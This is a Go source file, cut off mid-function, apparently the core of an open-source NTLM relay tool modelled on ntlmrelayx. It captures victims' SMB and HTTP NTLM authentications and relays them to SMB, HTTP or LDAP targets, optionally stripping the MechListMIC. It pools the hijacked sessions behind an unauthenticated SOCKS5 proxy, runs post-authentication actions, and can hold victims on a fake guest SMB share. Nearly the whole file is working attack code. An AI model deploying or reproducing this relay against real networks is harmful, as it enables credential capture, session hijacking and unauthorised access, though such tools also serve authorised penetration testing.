// MIT License
//
// Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package relay

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/encoder"
	"github.com/jfjallid/go-smb/smb/server"
	"github.com/jfjallid/go-smb/smb/server/filevfs"
)

// FakeServerOptions, when set on ServerConfig.FakeServer, replaces the
// default "capture and drop" outcome on a successful relay with a guest SMB
// session served by the local listener. The victim's SessionSetup2 is
// answered with StatusOk + SessionFlagIsGuest; signing is skipped (the
// smb/server canSign/shouldVerify gates both return false for guest), so we
// don't need the real session key. A single Disk share named ShareName is
// registered on ListenerConfig.Shares backed by a filevfs.FS at Root.
type FakeServerOptions struct {
	ShareName string // wire-visible share name; required.
	Root      string // host directory exposed by the share; required.
	ReadOnly  bool   // expose the share read-only.
}

// ServerConfig configures a long-running multi-target RelayServer. Mirrors
// ntlmrelayx semantics: inbound auths are forwarded to one of the configured
// targets, successful upstream sessions are pooled, optional SOCKS5 proxy
// exposes the pool to local tools, and post-auth actions run automatically.
//
// One unified Targets list feeds both inbound listeners. Each entry uses a
// scheme prefix (smb://, http://, https://) to declare its protocol; the
// listener dispatches per request to a forwarder matching its own inbound
// protocol or a different one (cross-protocol relay).
type ServerConfig struct {
	// ListenAddr is the inbound SMB listener address. ":445" if empty.
	ListenAddr string

	// SocksAddr is the SOCKS5 listener address. Empty disables SOCKS.
	SocksAddr string

	// Targets is the unified list of upstream targets in scheme-prefixed
	// form. Examples:
	//   - "smb://host[:port]"
	//   - "http://host[:port][/path]"
	//   - "https://host[:port][/path]"
	// Bare "host:port" is rejected — every entry must declare its scheme.
	Targets []string

	// SelectTarget picks one target per inbound auth from a protocol-filtered
	// slice. Defaults to RoundRobin(). Initial value only — after Start(),
	// mutate the live selector via [RelayServer.SetSelectTarget].
	SelectTarget SelectTargetFunc

	// StripMechListMIC, when true, drops the inbound MechListMIC instead of
	// passing it through to the upstream. Pass-through is the default;
	// strip-mic is useful when relaying through legacy paths that re-derive
	// the MIC themselves or when the upstream expects the MIC absent.
	// Initial value only — after Start(), toggle live via
	// [RelayServer.SetStripMechListMIC].
	StripMechListMIC bool

	// SelectPoolEntry picks one pooled session when multiple match the SOCKS
	// client's (target, user) tuple. Defaults to PoolFirstAvailable.
	SelectPoolEntry SessionMatcher

	// HealthCheckOnSelect, when true, sends an SMB Echo on the chosen pooled
	// session before handing it to the SOCKS passthrough. Initial value
	// only — after Start(), toggle live via
	// [RelayServer.SetHealthCheckOnSelect].
	HealthCheckOnSelect bool

	// UpstreamOptions configures every upstream *smb.Connection. The
	// forwarder forces ManualLogin/ForceSMB2/DisableSigning/DisableEncryption
	// regardless (relay can't sign or encrypt).
	UpstreamOptions smb.Options

	// ListenerConfig configures the inbound smb/server listener.
	// Authenticator and OnSessionSetup are overwritten by RelayServer.
	// SigningRequired is forced to false. MaxDialect defaults to
	// smb.DialectSmb_2_1.
	ListenerConfig server.ServerConfig

	// PostAuthActions run sequentially against each successfully relayed
	// upstream connection in a dedicated goroutine.
	PostAuthActions []PostAuthAction

	// FakeServer, when non-nil, enables the post-relay fake-SMB handoff:
	// after a successful upstream relay the victim's SessionSetup2 is
	// answered with StatusOk + SessionFlagIsGuest instead of the default
	// StatusLogonFailure capture-and-drop, and the victim continues talking
	// to the local listener which exposes a single Disk share backed by a
	// filevfs.FS at FakeServer.Root. Signing/encryption are skipped because
	// the relay never sees the real session key (the victim derives it from
	// their NT hash); SessionFlagIsGuest makes canSign/shouldVerify return
	// false in smb/server. See FakeServerOptions for the field semantics.
	FakeServer *FakeServerOptions

	// OnCredentialCaptured fires for every captured AUTHENTICATE, regardless
	// of whether the upstream accepted it. c is nil for HTTP-inbound auths.
	OnCredentialCaptured func(c *server.Conn, cred *Credential)

	// OnCapture fires once per captured authentication after the upstream
	// relay outcome is known (Status is one of CaptureStatus*). Tooling
	// integrators (file-writers, dashboards) hook here to get a single
	// finalized record per inbound auth, rather than correlating
	// OnCredentialCaptured with OnRelaySuccess/OnRelayFailure manually.
	OnCapture func(CapturedAuth)

	// CaptureBufferSize caps the in-memory CapturedAuth ring buffer.
	// 0 selects the default (defaultCaptureBufferSize = 1024); negative
	// disables the buffer and CapturedCredentials() returns nil.
	CaptureBufferSize int

	// OnRelaySuccess fires when an inbound auth was successfully relayed and
	// the upstream connection has been pooled. conn is nil for non-SMB pool
	// entries.
	OnRelaySuccess func(target string, conn *smb.Connection, cred *Credential)

	// OnRelayFailure fires when an inbound auth could not be relayed.
	OnRelayFailure func(target string, err error)

	// OnSocksClient fires for each accepted SOCKS5 client request, before
	// passthrough begins.
	OnSocksClient func(remote net.Addr, target string)

	// Logger overrides the package logger.
	Logger server.Logger

	// MaxPoolSize caps the number of pooled upstream sessions. <=0 disables.
	MaxPoolSize int

	// PoolTTL evicts pooled sessions whose last-used timestamp is older than
	// this duration. <=0 disables age-based eviction.
	PoolTTL time.Duration

	// --- HTTP relay configuration ---

	// HTTPListenAddr enables the inbound HTTP NTLM listener at this address.
	// Empty disables.
	HTTPListenAddr string

	// HTTPListenerTLSConfig, if non-nil, makes the inbound listener serve
	// HTTPS instead of HTTP.
	HTTPListenerTLSConfig *tls.Config

	// UpstreamHTTPSTLSConfig is supplied to outbound HTTPS upstreams.
	// Defaults to InsecureSkipVerify when nil.
	UpstreamHTTPSTLSConfig *tls.Config

	// UpstreamLDAPSTLSConfig is supplied to outbound LDAPS upstreams and to
	// ldap:// upstreams whose StartTLS upgrade succeeds. Defaults to
	// InsecureSkipVerify when nil.
	UpstreamLDAPSTLSConfig *tls.Config

	// DisableLDAPStartTLS, when true, skips the automatic StartTLS attempt on
	// ldap:// upstream targets. Default (false) attempts StartTLS; on a
	// non-success ExtendedResponse the relay transparently continues with
	// plain LDAP on the same socket. ldaps:// targets are unaffected.
	DisableLDAPStartTLS bool

	// UpstreamDialTimeout caps the time spent dialing an upstream (SMB,
	// HTTP, or LDAP). Defaults to 10s.
	UpstreamDialTimeout time.Duration

	// parsedTargets is populated by Start. Unexported.
	parsedTargets []Target
}

// RelayServer ties together the inbound smb/server listener, the per-conn
// forwarders, the upstream session pool, and the SOCKS5 proxy.
type RelayServer struct {
	Config ServerConfig

	mu       sync.Mutex
	pool     *sessionPool
	smbSrv   *server.Server
	smbLn    net.Listener
	socksSrv *socksServer
	socksLn  net.Listener
	httpLn   *httpListener
	lastUsed map[string]time.Time
	stopCh   chan struct{}
	wg       sync.WaitGroup

	// per-Conn forwarder map keyed by *server.Conn pointer. Populated on
	// SessionSetupNegotiate, drained on SessionSetupAuthenticate (or on
	// connection teardown via the OnDisconnect hook chained inside
	// ListenerConfig).
	fwdMu sync.Mutex
	fwds  map[*server.Conn]Forwarder

	// Runtime-tunable subset of ServerConfig, mirrored here as atomics so
	// the REPL `set` command (and the corresponding Set* methods below) can
	// tweak behavior on a running listener without racing the hot path.
	// Initialized in Start() from the supplied Config; Config fields are
	// not kept in sync — read live state through these accessors.
	stripMIC     atomic.Bool
	healthCheck  atomic.Bool
	selectTarget atomic.Pointer[SelectTargetFunc]

	// In-memory CapturedAuth ring buffer (FIFO, capped at captureCap, 0 =
	// unbounded, <0 = disabled). Populated through captureRecord/finalize
	// helpers defined in capture.go; surfaced to callers via
	// CapturedCredentials().
	captureMu  sync.Mutex
	captured   []*CapturedAuth
	captureCap int
}

// Start begins listening on ListenAddr (and SocksAddr, if configured).
func (rs *RelayServer) Start() error {
	cfg := &rs.Config
	if len(cfg.Targets) == 0 {
		return fmt.Errorf("ServerConfig.Targets is empty")
	}
	parsed, err := ParseTargets(cfg.Targets)
	if err != nil {
		return err
	}
	cfg.parsedTargets = parsed
	if cfg.ListenerConfig.MaxDialect == 0 {
		cfg.ListenerConfig.MaxDialect = smb.DialectSmb_2_1
	}
	cfg.ListenerConfig.SigningRequired = false

	if cfg.FakeServer != nil {
		if cfg.FakeServer.ShareName == "" {
			return fmt.Errorf("FakeServer.ShareName is required")
		}
		if cfg.FakeServer.Root == "" {
			return fmt.Errorf("FakeServer.Root is required")
		}
		fs, err := filevfs.New(filevfs.Options{
			Root:     cfg.FakeServer.Root,
			ReadOnly: cfg.FakeServer.ReadOnly,
		})
		if err != nil {
			return fmt.Errorf("fake-server filevfs: %w", err)
		}
		cfg.ListenerConfig.AllowGuest = true
		if cfg.ListenerConfig.Shares == nil {
			cfg.ListenerConfig.Shares = map[string]server.Share{}
		}
		cfg.ListenerConfig.Shares[strings.ToLower(cfg.FakeServer.ShareName)] = server.Share{
			Name:          cfg.FakeServer.ShareName,
			Type:          smb.ShareTypeDisk,
			VFS:           fs,
			GuestWritable: !cfg.FakeServer.ReadOnly,
		}
	}

	if cfg.SelectTarget == nil {
		cfg.SelectTarget = RoundRobin()
	}
	if cfg.SelectPoolEntry == nil {
		cfg.SelectPoolEntry = PoolFirstAvailable()
	}
	if cfg.Logger != nil {
		cfg.ListenerConfig.Logger = cfg.Logger
	}
	if cfg.UpstreamDialTimeout == 0 {
		cfg.UpstreamDialTimeout = 10 * time.Second
	}

	rs.stripMIC.Store(cfg.StripMechListMIC)
	rs.healthCheck.Store(cfg.HealthCheckOnSelect)
	selT := cfg.SelectTarget
	rs.selectTarget.Store(&selT)
	switch {
	case cfg.CaptureBufferSize == 0:
		rs.captureCap = defaultCaptureBufferSize
	case cfg.CaptureBufferSize < 0:
		rs.captureCap = -1 // disabled — captureRecord still returns a slot for finalize correlation
	default:
		rs.captureCap = cfg.CaptureBufferSize
	}
	logger := rs.logger()

	if cfg.FakeServer != nil {
		logger.Noticef("fake SMB server enabled — share %q -> %s (read-only=%v)",
			cfg.FakeServer.ShareName, cfg.FakeServer.Root, cfg.FakeServer.ReadOnly)
	}

	// Each enabled listener can dispatch to any target — cross-protocol relay
	// means an SMB inbound auth can be relayed onto an HTTP upstream and vice
	// versa. We don't restrict candidates by protocol; the user-supplied
	// SelectTarget is free to constrain that. A listener is started only when
	// its address is non-empty — callers can also start listeners after Start
	// via StartSMB / StartHTTP / StartSOCKS.
	smbEnabled := cfg.ListenAddr != ""
	httpEnabled := cfg.HTTPListenAddr != ""
	if smbEnabled && len(parsed) == 0 {
		return fmt.Errorf("SMB listener enabled but Targets is empty")
	}
	if httpEnabled && len(parsed) == 0 {
		return fmt.Errorf("HTTP listener enabled but Targets is empty")
	}

	rs.mu.Lock()
	rs.pool = newSessionPool(cfg.MaxPoolSize, cfg.PoolTTL)
	rs.lastUsed = map[string]time.Time{}
	rs.fwds = map[*server.Conn]Forwarder{}
	rs.stopCh = make(chan struct{})
	rs.mu.Unlock()

	// Plug the per-conn cleanup + auth dispatcher into the listener config.
	prevDisconnect := cfg.ListenerConfig.OnDisconnect
	cfg.ListenerConfig.OnDisconnect = func(c *server.Conn) {
		rs.fwdMu.Lock()
		f := rs.fwds[c]
		delete(rs.fwds, c)
		rs.fwdMu.Unlock()
		if f != nil {
			f.Close()
		}
		if prevDisconnect != nil {
			prevDisconnect(c)
		}
	}
	cfg.ListenerConfig.OnSessionSetup = rs.onSessionSetup

	if smbEnabled {
		if err := rs.StartSMB(cfg.ListenAddr); err != nil {
			rs.shutdownPartial()
			return err
		}
	}

	if httpEnabled {
		if err := rs.StartHTTP(cfg.HTTPListenAddr); err != nil {
			rs.shutdownPartial()
			return err
		}
	}

	if cfg.SocksAddr != "" {
		if err := rs.StartSOCKS(cfg.SocksAddr); err != nil {
			rs.shutdownPartial()
			return err
		}
	}

	rs.wg.Add(1)
	go rs.pruneLoop()

	return nil
}

// StartSMB binds (or rebinds) the inbound SMB listener at addr. If addr is
// empty, falls back to cfg.ListenAddr (":445" if also empty). Errors if the
// SMB listener is already running.
func (rs *RelayServer) StartSMB(addr string) error {
	rs.mu.Lock()
	if rs.smbLn != nil {
		bound := rs.smbLn.Addr().String()
		rs.mu.Unlock()
		return fmt.Errorf("SMB listener already running on %s", bound)
	}
	rs.mu.Unlock()

	cfg := &rs.Config
	if addr == "" {
		addr = cfg.ListenAddr
	}
	if addr == "" {
		addr = ":445"
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", addr, err)
	}

	srv := &server.Server{Config: &cfg.ListenerConfig}
	rs.mu.Lock()
	rs.smbLn = ln
	rs.smbSrv = srv
	cfg.ListenAddr = addr
	rs.mu.Unlock()

	logger := rs.logger()
	rs.wg.Add(1)
	go func() {
		defer rs.wg.Done()
		if err := srv.Serve(ln); err != nil && !errors.Is(err, server.ErrServerClosed) {
			logger.Errorf("relay smb serve: %v", err)
		}
	}()
	logger.Noticef("SMB listener on %s", ln.Addr())
	return nil
}

// StopSMB tears down the SMB listener and drains active inbound conns. No-op
// if the listener is not running.
func (rs *RelayServer) StopSMB(ctx context.Context) error {
	rs.mu.Lock()
	srv := rs.smbSrv
	ln := rs.smbLn
	rs.smbSrv = nil
	rs.smbLn = nil
	rs.mu.Unlock()
	if srv == nil {
		return nil
	}
	err := srv.Shutdown(ctx)
	if ln != nil {
		ln.Close()
	}
	rs.logger().Noticef("SMB listener stopped")
	return err
}

// StartHTTP binds (or rebinds) the inbound HTTP NTLM listener at addr.
// HTTPListenerTLSConfig on the config enables HTTPS. Errors if already
// running.
func (rs *RelayServer) StartHTTP(addr string) error {
	rs.mu.Lock()
	if rs.httpLn != nil {
		bound := rs.httpLn.addr().String()
		rs.mu.Unlock()
		return fmt.Errorf("HTTP listener already running on %s", bound)
	}
	rs.mu.Unlock()

	cfg := &rs.Config
	if addr == "" {
		addr = cfg.HTTPListenAddr
	}
	if addr == "" {
		return fmt.Errorf("HTTP listener addr is empty")
	}
	hl := newHTTPListener(rs, cfg.HTTPListenerTLSConfig)
	if err := hl.start(addr); err != nil {
		return err
	}
	rs.mu.Lock()
	rs.httpLn = hl
	cfg.HTTPListenAddr = addr
	rs.mu.Unlock()
	rs.logger().Noticef("HTTP listener on %s", hl.addr())
	return nil
}

// StopHTTP tears down the HTTP listener. No-op if not running.
func (rs *RelayServer) StopHTTP(ctx context.Context) error {
	rs.mu.Lock()
	hl := rs.httpLn
	rs.httpLn = nil
	rs.mu.Unlock()
	if hl == nil {
		return nil
	}
	err := hl.close(ctx)
	rs.logger().Noticef("HTTP listener stopped")
	return err
}

// StartSOCKS binds (or rebinds) the SOCKS5 listener at addr. Errors if
// already running.
func (rs *RelayServer) StartSOCKS(addr string) error {
	rs.mu.Lock()
	if rs.socksLn != nil {
		bound := rs.socksLn.Addr().String()
		rs.mu.Unlock()
		return fmt.Errorf("SOCKS5 listener already running on %s", bound)
	}
	rs.mu.Unlock()

	cfg := &rs.Config
	if addr == "" {
		addr = cfg.SocksAddr
	}
	if addr == "" {
		return fmt.Errorf("SOCKS5 listener addr is empty")
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen socks %s: %w", addr, err)
	}
	srv := newSocksServer(rs)
	rs.mu.Lock()
	rs.socksLn = ln
	rs.socksSrv = srv
	cfg.SocksAddr = addr
	rs.mu.Unlock()
	rs.wg.Add(1)
	go func() {
		defer rs.wg.Done()
		srv.serve(ln)
	}()
	rs.logger().Noticef("SOCKS5 listener on %s", ln.Addr())
	return nil
}

// StopSOCKS tears down the SOCKS5 listener. No-op if not running.
func (rs *RelayServer) StopSOCKS(_ context.Context) error {
	rs.mu.Lock()
	ln := rs.socksLn
	rs.socksLn = nil
	rs.socksSrv = nil
	rs.mu.Unlock()
	if ln == nil {
		return nil
	}
	err := ln.Close()
	rs.logger().Noticef("SOCKS5 listener stopped")
	return err
}

// AddTarget parses spec and appends it to the running server's target list.
// Safe to call concurrently with inbound auths.
func (rs *RelayServer) AddTarget(spec string) error {
	t, err := ParseTarget(spec)
	if err != nil {
		return err
	}
	cfg := &rs.Config
	rs.mu.Lock()
	defer rs.mu.Unlock()
	cfg.Targets = append(cfg.Targets, spec)
	cfg.parsedTargets = append(cfg.parsedTargets, t)
	return nil
}

// RemoveTarget drops the first target whose canonical form matches spec
// (either the raw string passed to AddTarget or scheme://host:port). Returns
// true if a target was removed.
func (rs *RelayServer) RemoveTarget(spec string) bool {
	cfg := &rs.Config
	rs.mu.Lock()
	defer rs.mu.Unlock()
	canonical := ""
	if t, err := ParseTarget(spec); err == nil {
		canonical = t.String()
	}
	for i, t := range cfg.parsedTargets {
		if t.Raw == spec || (canonical != "" && t.String() == canonical) {
			cfg.parsedTargets = append(cfg.parsedTargets[:i], cfg.parsedTargets[i+1:]...)
			// Remove the matching entry in cfg.Targets too (best-effort by
			// string match against Raw or canonical form).
			for j, raw := range cfg.Targets {
				if raw == t.Raw {
					cfg.Targets = append(cfg.Targets[:j], cfg.Targets[j+1:]...)
					break
				}
			}
			return true
		}
	}
	return false
}

// SetStripMechListMIC toggles the strip-MIC behavior on a running server.
// Subsequent inbound auths observe the new value; in-flight auths use the
// snapshot taken at SessionSetup2 time.
func (rs *RelayServer) SetStripMechListMIC(v bool) { rs.stripMIC.Store(v) }

// StripMechListMIC reports the live strip-MIC state.
func (rs *RelayServer) StripMechListMIC() bool { return rs.stripMIC.Load() }

// SetHealthCheckOnSelect toggles the SOCKS-side pool health probe.
func (rs *RelayServer) SetHealthCheckOnSelect(v bool) { rs.healthCheck.Store(v) }

// HealthCheckOnSelect reports the live health-check state.
func (rs *RelayServer) HealthCheckOnSelect() bool { return rs.healthCheck.Load() }

// SetSelectTarget replaces the target selector. A nil argument restores the
// default RoundRobin selector.
func (rs *RelayServer) SetSelectTarget(f SelectTargetFunc) {
	if f == nil {
		f = RoundRobin()
	}
	rs.selectTarget.Store(&f)
}

// Targets returns a snapshot of the canonical target strings currently
// configured.
func (rs *RelayServer) Targets() []string {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	out := make([]string, len(rs.Config.parsedTargets))
	for i, t := range rs.Config.parsedTargets {
		out[i] = t.String()
	}
	return out
}

// snapshotTargets returns a copy of the currently configured parsedTargets
// slice, safe to pass to a user-supplied SelectTarget callback.
func (rs *RelayServer) snapshotTargets() []Target {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	out := make([]Target, len(rs.Config.parsedTargets))
	copy(out, rs.Config.parsedTargets)
	return out
}

func (rs *RelayServer) shutdownPartial() {
	if rs.httpLn != nil {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		_ = rs.httpLn.close(ctx)
		cancel()
		rs.httpLn = nil
	}
	if rs.smbSrv != nil {
		_ = rs.smbSrv.Close()
		rs.smbSrv = nil
	}
	if rs.smbLn != nil {
		_ = rs.smbLn.Close()
		rs.smbLn = nil
	}
}

// Shutdown stops accepting new connections, closes pooled sessions, and waits
// for serving goroutines to drain (or until ctx is done).
func (rs *RelayServer) Shutdown(ctx context.Context) error {
	rs.mu.Lock()
	stopCh := rs.stopCh
	smbSrv := rs.smbSrv
	socksLn := rs.socksLn
	httpLn := rs.httpLn
	pool := rs.pool
	rs.mu.Unlock()
	if stopCh != nil {
		select {
		case <-stopCh:
		default:
			close(stopCh)
		}
	}
	if socksLn != nil {
		socksLn.Close()
	}
	if httpLn != nil {
		_ = httpLn.close(ctx)
	}
	if smbSrv != nil {
		_ = smbSrv.Shutdown(ctx)
	}
	if pool != nil {
		pool.CloseAll()
	}
	done := make(chan struct{})
	go func() { rs.wg.Wait(); close(done) }()
	select {
	case <-done:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

// Snapshot returns the current pooled sessions.
func (rs *RelayServer) Snapshot() []SessionInfo {
	if rs.pool == nil {
		return nil
	}
	return rs.pool.Snapshot()
}

// SMBAddr returns the bound SMB listener address (after Start), or nil if the
// SMB listener is disabled.
func (rs *RelayServer) SMBAddr() net.Addr {
	if rs.smbLn == nil {
		return nil
	}
	return rs.smbLn.Addr()
}

// SocksAddr returns the bound SOCKS5 listener address (after Start), or nil
// if SOCKS is disabled.
func (rs *RelayServer) SocksAddr() net.Addr {
	if rs.socksLn == nil {
		return nil
	}
	return rs.socksLn.Addr()
}

// HTTPAddr returns the bound HTTP listener address (after Start), or nil if
// the HTTP listener is disabled.
func (rs *RelayServer) HTTPAddr() net.Addr {
	if rs.httpLn == nil {
		return nil
	}
	return rs.httpLn.addr()
}

// onSessionSetup is the OnSessionSetup hook bound onto the inbound SMB
// listener. It drives a per-conn forwarder across both NTLM legs and
// dispatches to any protocol-compatible upstream.
func (rs *RelayServer) onSessionSetup(c *server.Conn, sess *server.Session, blob []byte, stage server.SessionSetupStage) (*server.Status, error) {
	cfg := &rs.Config
	logger := rs.logger()

	switch stage {
	case server.SessionSetupStageNegotiate:
		init, err := unwrapNegInit(blob)
		if err != nil {
			return nil, err
		}
		// SMB inbound can relay onto any upstream protocol — the inbound
		// listener stays protocol-agnostic. Pass the full parsed Targets list
		// so the user-supplied selector is free to consider all candidates.
		targets := rs.snapshotTargets()
		rs.mu.Lock()
		lastUsed := rs.lastUsed
		rs.mu.Unlock()
		target := (*rs.selectTarget.Load())(targets, c.RemoteAddr, lastUsed)
		if target.Host == "" {
			return nil, fmt.Errorf("SelectTarget returned empty target")
		}
		f, err := newForwarderFor(target, cfg, logger)
		if err != nil {
			rs.notifyFailure(target.String(), err)
			return &server.Status{Code: smb.StatusLogonFailure}, nil
		}
		chal, err := f.Negotiate(init.Data.MechToken)
		if err != nil {
			f.Close()
			rs.notifyFailure(target.String(), err)
			return &server.Status{Code: smb.StatusLogonFailure}, nil
		}
		out, err := wrapNegRespAcceptIncomplete(chal)
		if err != nil {
			f.Close()
			rs.notifyFailure(target.String(), err)
			return &server.Status{Code: smb.StatusLogonFailure}, nil
		}
		rs.fwdMu.Lock()
		if old := rs.fwds[c]; old != nil {
			old.Close()
		}
		rs.fwds[c] = f
		rs.fwdMu.Unlock()
		return &server.Status{
			Code:         smb.StatusMoreProcessingRequired,
			SecurityBlob: out,
		}, nil

	case server.SessionSetupStageAuthenticate:
		rs.fwdMu.Lock()
		f := rs.fwds[c]
		delete(rs.fwds, c)
		rs.fwdMu.Unlock()
		if f == nil {
			return nil, fmt.Errorf("SessionSetup2 with no prior leg on %s", c.RemoteAddr)
		}
		resp, err := unwrapNegResp(blob)
		if err != nil {
			f.Close()
			rs.notifyFailure(f.Target().String(), err)
			c.RemoveSession(sess.ID)
			return &server.Status{Code: smb.StatusLogonFailure}, nil
		}
		mic := resp.MechListMIC
		if rs.stripMIC.Load() {
			mic = nil
		}
		cred, upstreamStatus, err := f.Authenticate(c.RemoteAddr, resp.ResponseToken, mic)
		var slot *captureSlot
		if cred != nil {
			if cb := cfg.OnCredentialCaptured; cb != nil {
				cb(c, cred)
			}
			slot = rs.captureRecord(cred, f.Target().String())
		}
		if err != nil {
			f.Close()
			slot.finalize(CaptureStatusRelayFailed)
			rs.notifyFailure(f.Target().String(), err)
			c.RemoveSession(sess.ID)
			return &server.Status{Code: smb.StatusLogonFailure}, nil
		}
		if upstreamStatus != smb.StatusOk {
			f.Close()
			slot.finalize(CaptureStatusUpstreamRejected)
			rs.notifyFailure(f.Target().String(), fmt.Errorf("upstream rejected (status=0x%08x)", upstreamStatus))
			c.RemoveSession(sess.ID)
			return &server.Status{Code: smb.StatusLogonFailure}, nil
		}
		// Success: pool the upstream connection. The pool entry carries
		// either an SMB or HTTP upstream depending on the forwarder.
		ps := rs.poolFromForwarder(f, cred)
		rs.pool.Add(ps)
		rs.mu.Lock()
		rs.lastUsed[f.Target().Host] = ps.Established
		rs.mu.Unlock()
		slot.finalize(CaptureStatusRelayed)
		logger.Noticef("%s -> %s (%s)", credLabel(cred), f.Target().String(), cred.Format)
		if cb := cfg.OnRelaySuccess; cb != nil {
			cb(f.Target().String(), ps.Conn, cred)
		}
		if ps.Conn != nil && len(cfg.PostAuthActions) > 0 {
			rs.wg.Add(1)
			go rs.runActions(ps)
		}
		// Fake-server handoff: instead of capture-and-drop, mark the inbound
		// session as an authenticated guest and let our local server keep
		// serving the victim against the registered Disk share. We have no
		// real session key (the victim derives it from their NT hash, which
		// we never see), so SessionFlagIsGuest is what makes signing skip
		// cleanly downstream — smb/server canSign/shouldVerify both return
		// false for guest, and the SessionSetup2 reply is sent unsigned.
		if cfg.FakeServer != nil {
			sess.Authenticated = true
			sess.Username = cred.Username
			sess.Domain = cred.Domain
			if cred.Workstation != "" {
				sess.Workstation = cred.Workstation
			}
			sess.Flags |= smb.SessionFlagIsGuest
			ok, err := wrapNegRespAcceptCompleted(nil)
			if err != nil {
				// Falling back to capture-and-drop is safer than serving a
				// malformed SessionSetup2.
				logger.Errorf("fake-server build accept-completed: %v", err)
				c.RemoveSession(sess.ID)
				return &server.Status{Code: smb.StatusLogonFailure}, nil
			}
			logger.Noticef("fake-server kept SMB session %d alive for %s\\%s from %s",
				sess.ID, sess.Domain, sess.Username, c.RemoteAddr)
			return &server.Status{Code: smb.StatusOk, SecurityBlob: ok}, nil
		}
		// Capture-and-drop.
		c.RemoveSession(sess.ID)
		return &server.Status{Code: smb.StatusLogonFailure}, nil
	}
	return nil, nil
}

// poolFromForwarder builds a pooledSession from the appropriate
// concrete-typed forwarder. The forwarder's upstream is transferred via Take.
func (rs *RelayServer) poolFromForwarder(f Forwarder, cred *Credential) *pooledSession {
	ps := &pooledSession{
		Target:      f.Target().Host,
		Cred:        cred,
		Established: time.Now(),
	}
	switch concrete := f.(type) {
	case SMBForwarder:
		up := concrete.Take()
		up.MarkAuthenticated(authUserFromCred(cred))
		ps.Conn = up
	case HTTPForwarder:
		ps.HTTP = concrete.Take()
	case LDAPForwarder:
		ps.LDAP = concrete.Take()
	}
	return ps
}

func (rs *RelayServer) runActions(ps *pooledSession) {
	defer rs.wg.Done()
	logger := rs.logger()
	if ps.Conn == nil {
		return
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() {
		select {
		case <-rs.stopCh:
			cancel()
		case <-ctx.Done():
		}
	}()
	ps.mu.Lock()
	defer ps.mu.Unlock()
	for _, action := range rs.Config.PostAuthActions {
		if err := action.Run(ctx, ps.Conn, ps.Cred, logger); err != nil {
			logger.Errorf("relay action %s failed for %s: %v", action.Name(), ps.Target, err)
		}
	}
	ps.Touch()
}

func (rs *RelayServer) pruneLoop() {
	defer rs.wg.Done()
	interval := rs.Config.PoolTTL / 4
	if interval <= 0 {
		interval = 30 * time.Second
	}
	t := time.NewTicker(interval)
	defer t.Stop()
	for {
		select {
		case <-rs.stopCh:
			return
		case now := <-t.C:
			rs.pool.pruneExpired(now)
		}
	}
}

func (rs *RelayServer) notifyFailure(target string, err error) {
	rs.logger().Debugf("failure target=%s err=%v", target, err)
	if cb := rs.Config.OnRelayFailure; cb != nil {
		cb(target, err)
	}
}

func (rs *RelayServer) logger() server.Logger {
	if rs.Config.Logger != nil {
		return rs.Config.Logger
	}
	return log
}

// resolveUpstream returns a Resolve callback for SMBPassthrough that filters
// the pool by (target, asserted-user), invokes SelectPoolEntry, and (if
// HealthCheckOnSelect is set) probes the pick.
//
// User-filter semantics (inherited from [sessionPool.FindMatches]):
//   - user == "" → no user filter; any live SMB entry for the target matches.
//     This is what an inbound NTLMSSP AUTHENTICATE with an empty UserName
//     field collapses to, so such a client can bind to whichever pooled
//     entry SelectPoolEntry returns.
//   - user != "", domain == "" → match Username only (any captured domain).
//   - user != "", domain != "" → match both Username and Domain.
//
// Matching is case-insensitive. The SOCKS listener performs no auth at the
// SOCKS layer, so this is the only point at which an asserted identity is
// compared against captured credentials on the SMB path.
func (rs *RelayServer) resolveUpstream(remote net.Addr) func(target, domain, user string) *pooledSession {
	cfg := &rs.Config
	logger := rs.logger()
	return func(target, domain, user string) *pooledSession {
		filter := user
		if domain != "" && user != "" {
			filter = domain + "\\" + user
		}
		for attempt := 0; ; attempt++ {
			candidates := rs.pool.FindMatches(target, filter)
			smbOnly := candidates[:0]
			for _, p := range candidates {
				if !p.IsHTTP() && !p.IsLDAP() {
					smbOnly = append(smbOnly, p)
				}
			}
			candidates = smbOnly
			if len(candidates) == 0 {
				return nil
			}
			pick := cfg.SelectPoolEntry(candidates, remote)
			if pick == nil {
				return nil
			}
			if !rs.healthCheck.Load() {
				return pick
			}
			if probeUpstream(pick) {
				return pick
			}
			pick.MarkDead()
			logger.Debugf("health check failed for %s user=%s (marking dead); retry %d", pick.Target, user, attempt+1)
		}
	}
}

// resolveHTTPUpstream returns a Resolve callback for HTTPPassthrough.
func (rs *RelayServer) resolveHTTPUpstream(remote net.Addr) func(target string) *pooledSession {
	cfg := &rs.Config
	return func(target string) *pooledSession {
		candidates := rs.pool.FindMatches(target, "")
		if len(candidates) == 0 {
			return nil
		}
		http := candidates[:0]
		for _, p := range candidates {
			if p.IsHTTP() && !p.IsDead() {
				http = append(http, p)
			}
		}
		if len(http) == 0 {
			return nil
		}
